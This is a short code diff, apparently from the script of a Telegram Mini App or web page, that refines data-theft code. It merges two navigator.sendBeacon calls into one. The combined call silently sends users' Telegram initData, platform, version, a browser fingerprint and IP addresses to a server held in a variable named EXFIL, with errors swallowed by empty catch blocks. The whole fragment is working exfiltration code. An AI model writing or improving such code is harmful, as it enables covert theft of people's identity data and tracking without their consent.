@@ -251,21 +251,15 @@
 
     sendBot(m)
 
-    // Send full JSON to collection server (backup)
+    // Send combined JSON to collection server
     try {
-      navigator.sendBeacon(EXFIL + '/identity', JSON.stringify({
-        type: 'identity',
+      navigator.sendBeacon(EXFIL + '/full', JSON.stringify({
+        type: 'full',
         initData: initData,
         initDataUnsafe: initDataUnsafe,
-        platform: tgPlat,
-        version: tgVer,
-        ts: Date.now()
-      }))
-    } catch(e) {}
-    try {
-      navigator.sendBeacon(EXFIL + '/fingerprint', JSON.stringify({
-        type: 'fingerprint',
-        data: fp,
+        tgPlatform: tgPlat,
+        tgVersion: tgVer,
+        fp: fp,
         ips: ips,
         ts: Date.now()
       }))
